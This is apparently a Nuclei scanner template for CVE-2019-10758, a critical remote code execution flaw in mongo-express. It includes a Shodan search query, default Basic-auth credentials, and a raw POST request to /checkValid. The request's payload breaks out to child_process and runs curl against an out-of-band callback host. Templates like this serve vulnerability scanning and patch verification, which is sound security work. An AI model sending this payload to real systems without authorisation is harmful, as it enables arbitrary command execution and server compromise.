id: CVE-2019-10758
info:
  name: mongo-express Remote Code Execution
  author:
  - l0ne1y
  tags:
  - cve
  - cve2019
  - mongo
  - mongo-express
  description: |-
    Mongo-express < 0.54.0 远程命令执行漏洞
    mongo-express是一款用于交互式管理MongoDB数据库的、基于Web的轻量级管理界面。
    mongo-express 0.54.0之前版本中存在安全漏洞。攻击者可借助使用toBSON方法的端点利用该漏洞执行代码
  reference:
  - https://github.com/vulhub/vulhub/tree/master/mongo-express/cve-2019-10758
  - https://nvd.nist.gov/vuln/detail/cve-2019-10758
  - https://snyk.io/vuln/snyk-js-mongoexpress-473215
  severity: critical
  metadata:
    shodan-query: http.title:"Mongo Express"
  classification:
    cve-id:
    - cve-2019-10758
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：
    https://github.com/mongo-express
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  raw:
  - |
    POST /checkValid HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic YWRtaW46cGFzcw==
    Content-Type: application/x-www-form-urlencoded

    document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl http://{{interactsh-url}}")
